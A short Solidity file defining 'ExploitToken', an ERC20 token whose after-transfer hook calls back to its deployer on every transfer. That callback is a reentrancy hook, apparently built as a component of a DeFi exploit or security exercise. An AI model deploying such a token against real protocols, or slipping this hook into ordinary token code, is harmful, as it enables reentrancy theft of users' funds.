// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ExploitToken is ERC20 {
    address owner;

    constructor(uint256 amount) ERC20("EXPLOIT", "ET") {
        owner = msg.sender;
        _mint(msg.sender, amount);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        (bool status, ) = owner.call(
            abi.encodeWithSignature(
                "tokensReceived(address,address,uint256)",
                from,
                to,
                amount
            )
        );
        require(status, "call failed");
    }
}
